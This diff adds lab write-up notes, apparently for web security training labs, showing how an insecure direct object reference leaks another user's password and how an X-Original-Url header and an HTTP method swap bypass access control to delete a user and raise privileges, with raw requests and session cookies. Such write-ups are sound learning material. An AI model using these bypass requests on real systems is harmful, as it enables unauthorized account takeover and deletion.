@@ -106,3 +106,110 @@
 Delete carlos's account
 
 ## Lab: Insecure direct object references
+1. After downloading chat logs we can see the file is named `2.txt`. 
+2. After inspecting the body request we can see that we request for `2.txt` file.
+3. Sending `GET` request for `1.txt` file allows us to download it:
+    ```
+    CONNECTED: -- Now chatting with Hal Pline --
+    You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
+    Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
+    You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
+    Hal Pline: Takes one to know one
+    You: Ok so my password is n5w431x02bxqh6jzax7x. Is that right?
+    Hal Pline: Yes it is!
+    You: Ok thanks, bye!
+    Hal Pline: Do one!
+
+    ```
+
+4. We can see the password. After logging into carlos account we finish the lab.
+
+## Lab: URL-based access control can be circumvented
+1. After adding `X-Original-Url` with value `/admin` we were able to access **admin-panel**
+
+    ```
+    GET / HTTP/2
+    Host: 0a7a00de046841d88374e6c90092006c.web-security-academy.net
+    X-Original-Url: /admin
+    ```
+2. Looking into website source code we can see how the url with the deletion request is built.
+
+    ```
+    href="/admin/delete?username=carlos"
+    ```
+3. After preparing new request body I got the error: "Missing parameter 'username'". So I added username value at the bottom.  After refreshing the website we get information about completing the task.
+    ```
+    GET / HTTP/2
+    Host: 0a7a00de046841d88374e6c90092006c.web-security-academy.net
+    X-Original-Url: /admin/delete?username=carlos
+    Cookie: session=0ZxlCXpZuOKWtHgsYjXIMX7s5ZknqiAQ
+    Cache-Control: max-age=0
+    Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
+    Sec-Ch-Ua-Mobile: ?0
+    Sec-Ch-Ua-Platform: "macOS"
+    Accept-Language: en-GB,en;q=0.9
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-User: ?1
+    Sec-Fetch-Dest: document
+    Referer: https://0a7a00de046841d88374e6c90092006c.web-security-academy.net/login
+    Accept-Encoding: gzip, deflate, br
+    Priority: u=0, i
+    Content-Length: 15
+
+    username=carlos
+    ```
+## Lab: Method-based access control can be circumvented
+1. After logging into admin account I familiarized myself with this request:
+    ```
+    POST /admin-roles HTTP/2
+    Host: 0a6b00830383ec1880fcda2500ae0049.web-security-academy.net
+    Cookie: session=2v7rI08pDyyzMrV7ghKpwzgJ5g5RnX1C
+    Content-Length: 30
+    Cache-Control: max-age=0
+    Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
+    Sec-Ch-Ua-Mobile: ?0
+    Sec-Ch-Ua-Platform: "macOS"
+    Accept-Language: en-GB,en;q=0.9
+    Origin: https://0a6b00830383ec1880fcda2500ae0049.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-User: ?1
+    Sec-Fetch-Dest: document
+    Referer: https://0a6b00830383ec1880fcda2500ae0049.web-security-academy.net/admin
+    Accept-Encoding: gzip, deflate, br
+    Priority: u=0, i
+
+    username=wiener&action=upgrade
+    ```
+2. I swapped the session cookie to wiener's. And received 401 response code. Changing to POSTX request and again to GET solved the task.
+    ```
+    GET /admin-roles?username=wiener&action=upgrade HTTP/2
+    Host: 0a6b00830383ec1880fcda2500ae0049.web-security-academy.net
+    Cookie: session=tSj2K1IBTvBdPi7LZ40NUh5QdvzyYWZz
+    Cache-Control: max-age=0
+    Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
+    Sec-Ch-Ua-Mobile: ?0
+    Sec-Ch-Ua-Platform: "macOS"
+    Accept-Language: en-GB,en;q=0.9
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Sec-Fetch-Site: none
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-User: ?1
+    Sec-Fetch-Dest: document
+    Accept-Encoding: gzip, deflate, br
+    Priority: u=0, i
+
+    ```
+
+
+    
